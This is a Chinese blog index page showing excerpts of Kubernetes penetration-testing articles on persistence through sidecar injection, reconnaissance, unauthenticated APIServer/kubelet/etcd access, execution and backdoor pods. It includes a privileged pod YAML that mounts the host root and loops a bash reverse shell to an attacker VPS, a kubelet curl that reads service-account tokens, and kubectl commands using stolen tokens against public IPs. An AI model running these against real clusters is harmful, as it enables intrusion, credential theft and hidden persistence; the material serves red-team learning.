<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>K8s安全 | My Hugo Knowledgebase</title>

    <link rel="stylesheet" href="/css/main.css">


      <script src="/js/main.js"></script>


</head>
<body>
  <header>
    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
    Theme
  </button>
</div>

  </header>
  <main>
    
  <h1>K8s安全</h1>
  
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/">k8s权限维持-动态容器注入</a></h2>
      <h1 id="动态容器注入-一种隐蔽的k8s权限维持方法">动态容器注入-一种隐蔽的k8s权限维持方法</h1>
<p>恶意pod-&gt;反弹shell-&gt;挂载宿主机(node)/-&gt;cron写定时任务反弹shell-&gt;master-node</p>
<p>k8s控制器</p>
<p>众所周知，k8s的持久化有很多方法：</p>
<ul>
<li>部署后门pod</li>
<li>部署cronjob</li>
<li>部署shadowApiserver</li>
<li>部署恶意deployment</li>
<li>部署恶意deamonset</li>
</ul>
<p>这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？</p>
<p>这里就有一种叫做动态容器注入的方式</p>
<p>目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中</p>
<h2 id="利用sidecar容器技术进行注入">利用sidecar容器技术进行注入</h2>
<p>这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/</p>
<p>这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod</p>
<p>为什么选择daemonset：</p>
<ul>
<li>
<p>它能够确保所有节点（包括新增节点）上都运行一个Pod</p>
</li>
<li>
<p>如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod</p>
</li>
</ul>
<p>值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：</p>
<ul>
<li>
<p>容器是特权的（相当于docker run的时候带了–privileged选项）</p>
</li>
<li>
<p>容器与宿主机共享网络和PID命名空间（打破命名空间隔离）</p>
</li>
<li>
<p>容器内挂载宿主机根目录（打破文件系统隔离）</p>
</li>
</ul>
<p>这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了</p>
<h3 id="基础注入">基础注入</h3>
<p>一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：</p>
<p>我们探测一下是否存在kube-proxy：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get daemonset -n kube-system
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759568770178.png" alt="QQ_1759568770178"></p>
<p>我们也可以看到这个daemonset控制的pod：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569016043.png" alt="QQ_1759569016043"></p>
<p>接下来我们来读这个daemonset的yaml：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get daemonset -n kube-system -o yaml
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569170555.png" alt="QQ_1759569170555"></p>
<p>我们可以在这个yaml基础上进行修改实现注入：</p>
<ul>
<li>
<p>我们先分析原yaml的spec：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>  <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">revisionHistoryLimit</span>: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">k8s-app</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">k8s-app</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">command</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#ae81ff">/usr/local/bin/kube-proxy</span>
</span></span><span style="display:flex;"><span>          - --<span style="color:#ae81ff">config=/var/lib/kube-proxy/config.conf</span>
</span></span><span style="display:flex;"><span>          - --<span style="color:#ae81ff">hostname-override=$(NODE_NAME)</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">env</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">NODE_NAME</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">valueFrom</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">fieldRef</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">fieldPath</span>: <span style="color:#ae81ff">spec.nodeName</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">image</span>: <span style="color:#ae81ff">registry.k8s.io/kube-proxy:v1.30.14</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">IfNotPresent</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">resources</span>: {}
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">terminationMessagePath</span>: <span style="color:#ae81ff">/dev/termination-log</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">terminationMessagePolicy</span>: <span style="color:#ae81ff">File</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/lib/kube-proxy</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/lib/modules</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lib-modules</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">readOnly</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">nodeSelector</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">kubernetes.io/os</span>: <span style="color:#ae81ff">linux</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">priorityClassName</span>: <span style="color:#ae81ff">system-node-critical</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">schedulerName</span>: <span style="color:#ae81ff">default-scheduler</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>: {}
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">serviceAccount</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationGracePeriodSeconds</span>: <span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">tolerations</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">operator</span>: <span style="color:#ae81ff">Exists</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">configMap</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">defaultMode</span>: <span style="color:#ae81ff">420</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">type</span>: <span style="color:#ae81ff">FileOrCreate</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/lib/modules</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lib-modules</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">updateStrategy</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">rollingUpdate</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">maxSurge</span>: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">maxUnavailable</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">type</span>: <span style="color:#ae81ff">RollingUpdate</span>
</span></span></code></pre></div><p>我们只需要在此基础上增加两个新对象：</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">K8s渗透-信息搜集</a></h2>
      <h1 id="k8s渗透-信息搜集">K8s渗透-信息搜集</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网</p>
<p>k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico</p>
<p>而通信类型存在4种：</p>
<ul>
<li>同一pod内的容器间通信</li>
<li>不同pod间的通信</li>
<li>pod与service间的通信</li>
<li>集群外部的流量与service间的通信</li>
</ul>
<h2 id="shell环境辨别">shell环境辨别</h2>
<p>如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，可以参考我的笔记：<a href="https://www.cnblogs.com/yuy0ung/articles/18220591">快速识别虚拟主机、Docker和K8s集群环境</a></p>
<p>一些常用命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps aux
</span></span><span style="display:flex;"><span>ls -l .dockerenv
</span></span><span style="display:flex;"><span>capsh --print
</span></span><span style="display:flex;"><span>env | grep KUBE
</span></span><span style="display:flex;"><span>ls -l /run/secrets/kubernetes.io/
</span></span><span style="display:flex;"><span>mount
</span></span><span style="display:flex;"><span>df -h
</span></span><span style="display:flex;"><span>cat /proc/1/cgroup
</span></span><span style="display:flex;"><span>cat /etc/resolv.conf
</span></span><span style="display:flex;"><span>cat /etc/mtab
</span></span><span style="display:flex;"><span>cat /proc/self/status
</span></span><span style="display:flex;"><span>cat /proc/self/mounts
</span></span><span style="display:flex;"><span>cat /proc/net/unix
</span></span><span style="display:flex;"><span>cat /proc/1/mountinfo
</span></span></code></pre></div><p>这里的<code>cat /proc/1/cgroup</code>是分辨容器环境一个很实用的命令：</p>
<p>没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：</p>
<pre tabindex="0"><code>12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36
</code></pre><p>而k8s默认的cgroup信息格式如下：</p>
<pre tabindex="0"><code>12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197
</code></pre><h2 id="特权相关搜集">特权相关搜集</h2>
<p>另外<code>capsh --print</code>获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限：
<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751874769526.png" alt="QQ_1751874769526"></p>
<p>那如果没有capsh命令且无法安装怎么办呢？</p>
<ul>
<li>
<p>首先<code>cat /proc/1/status</code> 获取到 Capabilities hex 记录:</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875341210.png" alt="QQ_1751875341210"></p>
</li>
<li>
<p>然后在我们自己安装了capsh的主机上进行decode：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875475273.png" alt="QQ_1751875475273"></p>
</li>
</ul>
<p>如此即可达到代替<code>capsh --print</code>的效果</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/">K8s渗透-初始访问</a></h2>
      <h1 id="k8s渗透-初始访问">K8s渗透-初始访问</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限</p>
<h2 id="apiserver未授权">APIServer未授权</h2>
<h3 id="insecure-port开启">insecure-port开启</h3>
<p>典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权</p>
<p>如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：</p>
<p>直接访问8080端口，会返回可用的API列表：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751982848150.png" alt="QQ_1751982848150"></p>
<p>接下来需要用到kubectl，安装教程见<a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/?spm=a2c6h.12873639.article-detail.17.27ea1f40XfNqrj#install-using-native-package-management">官网</a></p>
<p>使用kubectl可以获取集群信息：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl -s <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>:<span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> get nodes
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384616909.png" alt="QQ_1752384616909"></p>
<p>上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod</p>
<h3 id="secure-port开启匿名访问">secure-port开启匿名访问</h3>
<p>即6443安全端口的未授权访问</p>
<p>若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为<code>system:anonymous</code>用户。</p>
<p>一般来说<code>system:anonymous</code>用户权限是很低的，但是如果运维人员管理失当，把<code>system:anonymous</code>用户绑定到了<code>cluster-admin</code>用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426203178.png" alt="QQ_1752426203178"></p>
<p>我们可以通过kubectl进行apiserver调用：</p>
<pre tabindex="0"><code>kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info
</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426404993.png" alt="QQ_1752426404993"></p>
<p>当然有可能会遇到这种情况：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426467047.png" alt="QQ_1752426467047"></p>
<p>这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426612745.png" alt="QQ_1752426612745"></p>
<p>当然有个很好用的工具叫<strong>cdk</strong>也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426961861.png" alt="QQ_1752426961861"></p>
<p>在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问<code>/api/v1/namespaces/default/secret</code>路由来尝试获取用户token：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754839911396.png" alt="QQ_1754839911396"></p>
<p>我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl auth can-i --list --server<span style="color:#f92672">=</span>https://119.8.60.88:6443 --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;token值&gt;&#34;</span> --insecure-skip-tls-verify
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752504397042.png" alt="QQ_1752504397042"></p>
<p>这里可以看到权限非常高</p>
<p>打法和不安全端口8080未授权类似，这里不再细说</p>
<h2 id="kubectl-proxy暴露">kubectl proxy暴露</h2>
<p>通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网</p>
<p>所以利用方式和apiserver未授权类似，这里不再细说</p>
<h2 id="kubelet未授权">kubelet未授权</h2>
<p>kubelet和kubectl的区别？</p>
<p>kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod</p>
<p>每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口</p>
<p>如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用</p>
<blockquote>
<p>例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸</p>
</blockquote>
<p>通过请求接口执行命令读取token：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -XPOST -k <span style="color:#e6db74">&#34;https://</span><span style="color:#e6db74">${</span>K8S<span style="color:#e6db74">}</span><span style="color:#e6db74">:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&#34;</span> -d <span style="color:#e6db74">&#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&#34;</span>
</span></span></code></pre></div><h2 id="etcd未授权">etcd未授权</h2>
<p>k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/">K8s渗透-执行</a></h2>
      <h1 id="k8s渗透-执行">K8s渗透-执行</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>执行阶段的主要任务是实现在集群内执行任意命令，获得shell</p>
<h2 id="kubectl-exec进入容器">kubectl exec进入容器</h2>
<p>当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># apiserver未授权时</span>
</span></span><span style="display:flex;"><span>kubectl -s x.x.x.x:8080 --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到kubeconfig文件时</span>
</span></span><span style="display:flex;"><span>kubectl --kubeconfig config --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到高权限token时</span>
</span></span><span style="display:flex;"><span>kubectl --server<span style="color:#f92672">=</span>https://x.x.x.x:6443 --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;token值&gt;&#34;</span> --insecure-skip-tls-verify --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span></code></pre></div><p>比如这里进入容器执行反弹shell命令</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png" alt="QQ_1755101935584"></p>
<p>成功监听到反弹shell：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png" alt="QQ_1755101972156"></p>
<h2 id="创建后门pod">创建后门pod</h2>
<p>获取初始访问权限后，通过创建后门pod来执行后续攻击，</p>
<p>首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">args</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;-c&#34;</span>
</span></span><span style="display:flex;"><span>      - |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span></code></pre></div><p>然后使用 kubectl 创建文件指定的恶意容器：</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/">K8s渗透-持久化</a></h2>
      <h1 id="k8s渗透-持久化">K8s渗透-持久化</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权</p>
<h2 id="部署后门容器">部署后门容器</h2>
<p>在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）</p>
<p>常见方法如下</p>
<h3 id="挂载目录">挂载目录</h3>
<p>向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：<a href="https://www.cnblogs.com/yuy0ung/articles/19054753">K8s渗透-权限提升</a></p>
<p>这里值得一提的是，我们可以使用这个配置：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
</span></span></code></pre></div><p>可以让pod在被关闭后重启</p>
<h3 id="使用k8s控制器部署后门容器">使用k8s控制器部署后门容器</h3>
<p>在前面 <a href="">K8s渗透-执行</a> 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span></code></pre></div><p>这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
